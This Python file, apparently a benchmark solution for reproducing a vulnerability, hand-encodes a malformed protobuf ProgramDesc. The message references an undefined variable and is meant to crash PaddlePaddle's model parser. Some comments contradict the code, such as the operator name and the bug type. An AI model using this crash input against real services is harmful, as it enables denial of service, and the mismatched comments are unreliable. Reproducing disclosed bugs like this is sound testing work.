import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Stack Buffer Overflow/Crash vulnerability.
        
        The vulnerability description matches a known issue in PaddlePaddle (CVE-2022-46459)
        where parsing a ProgramDesc fails to check if a referenced variable exists in the 
        node_id_map before dereferencing the iterator.
        
        The PoC is a malformed Protobuf 'ProgramDesc' message containing an 'OpDesc' 
        that references a variable name which is not defined in the 'BlockDesc' variables.
        """

        def encode_varint(value):
            if value < 0:
                value += (1 << 64)
            out = bytearray()
            while value > 0x7f:
                out.append((value & 0x7f) | 0x80)
                value >>= 7
            out.append(value)
            return bytes(out)

        def encode_tag(field_num, wire_type):
            return encode_varint((field_num << 3) | wire_type)

        def encode_bytes(field_num, data):
            return encode_tag(field_num, 2) + encode_varint(len(data)) + data

        def encode_string(field_num, s):
            return encode_bytes(field_num, s.encode('utf-8'))

        # 1. Construct OpDesc.Var (Proto Message)
        # Field 1: parameter (string) -> e.g., "X"
        # Field 2: arguments (repeated string) -> e.g., "missing_var"
        # We define an argument that will be looked up in node_id_map.
        op_var_payload = encode_string(1, "Input") + encode_string(2, "missing_node_ref")
        
        # 2. Construct OpDesc (Proto Message)
        # Field 3: type (string) -> "conv2d" (arbitrary op)
        # Field 1: inputs (repeated OpDesc.Var)
        op_desc_payload = encode_string(3, "test_op") + encode_bytes(1, op_var_payload)
        
        # 3. Construct BlockDesc (Proto Message)
        # Field 1: idx (int32) -> 0
        # Field 2: parent_idx (int32) -> 0
        # Field 4: ops (repeated OpDesc)
        # Field 3: vars (repeated VarDesc) -> OMITTED (Empty)
        # By omitting 'vars', the node_id_map will be empty, causing the lookup of 'missing_node_ref' to return end().
        block_desc_payload = (
            encode_tag(1, 0) + encode_varint(0) + 
            encode_tag(2, 0) + encode_varint(0) +
            encode_bytes(4, op_desc_payload)
        )
        
        # 4. Construct ProgramDesc (Proto Message)
        # Field 1: blocks (repeated BlockDesc)
        program_desc_payload = encode_bytes(1, block_desc_payload)
        
        return program_desc_payload